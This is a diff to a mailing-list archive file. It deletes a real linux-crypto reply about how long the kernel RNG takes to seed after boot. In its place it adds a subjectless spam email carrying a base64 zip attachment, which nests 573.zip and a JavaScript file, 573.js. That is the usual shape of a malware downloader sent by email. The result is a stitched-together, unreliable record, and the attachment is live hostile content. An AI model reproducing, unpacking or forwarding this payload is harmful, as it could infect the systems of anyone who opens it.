@@ -1,41 +1,55 @@
-From: Stephan =?ISO-8859-1?Q?M=FCller?= <smueller@chronox.de>
-Subject: Re: [kernel-hardening] Re: [PATCH v4 06/13] iscsi: ensure RNG is seeded before use
-Date: Sun, 18 Jun 2017 10:04:58 +0200
-Message-ID: <2639082.PtrrGWOPPL@positron.chronox.de>
-References: <20170606174804.31124-1-Jason@zx2c4.com> <CAHmME9rU_H6Jq7ArjDq1yByrYf1P7nyC4Y8tqkzG585U39MFLg@mail.gmail.com> <02d60ed4-4207-dd7d-8826-0f9f7f4e966d@suse.com>
+From: <membership@instituteofcredit.org>
+Subject: (unknown)
+Date: Sun, 18 Jun 2017 13:58:42 -0000
+Message-ID: <149779432210.23066.13338683073458926041@qubee.com.bd>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7Bit
-Cc: "Jason A. Donenfeld" <Jason@zx2c4.com>,
-        Theodore Ts'o <tytso@mit.edu>,
-        Linux Crypto Mailing List <linux-crypto@vger.kernel.org>,
-        LKML <linux-kernel@vger.kernel.org>,
-        kernel-hardening@lists.openwall.com,
-        Greg Kroah-Hartman <gregkh@linuxfoundation.org>,
-        David Miller <davem@davemloft.net>,
-        Eric Biggers <ebiggers3@gmail.com>,
-        "Nicholas A. Bellinger" <nab@linux-iscsi.org>,
-        Chris Leech <cleech@redhat.com>, open-iscsi@googlegroups.com
-To: Lee Duncan <lduncan@suse.com>
-Return-path: <linux-kernel-owner@vger.kernel.org>
-In-Reply-To: <02d60ed4-4207-dd7d-8826-0f9f7f4e966d@suse.com>
-Sender: linux-kernel-owner@vger.kernel.org
-List-Id: linux-crypto.vger.kernel.org
+Content-Type: application/zip; name="5314437.zip"
+Content-Transfer-Encoding: base64
+To: <linux-crypto@vger.kernel.org>
+Return-path: <linux-crypto-owner@vger.kernel.org>
+Received: from AWBL16-49.qubee.com.bd ([180.234.16.49]:40319 "HELO
+        qubee.com.bd" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org
+        with SMTP id S1753044AbdFRN6s (ORCPT
+        <rfc822;linux-crypto@vger.kernel.org>);
+        Sun, 18 Jun 2017 09:58:48 -0400
+Content-Disposition: attachment
+Subject: 
+Sender: linux-crypto-owner@vger.kernel.org
+List-ID: <linux-crypto.vger.kernel.org>
 
-Am Samstag, 17. Juni 2017, 05:45:57 CEST schrieb Lee Duncan:
-
-Hi Lee,
-
-> In your testing, how long might a process have to wait? Are we talking
-> seconds? Longer? What about timeouts?
->
-
-In current kernels (starting with 4.8) this timeout should clear within a few 
-seconds after boot.
-
-In older kernels (pre 4.8), my KVM takes up to 90 seconds to reach that 
-seeding point. I have heard that on IBM System Z this trigger point requires 
-minutes to be reached.
-
-Ciao
-Stephan
+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
+AGMHAAAAAA==
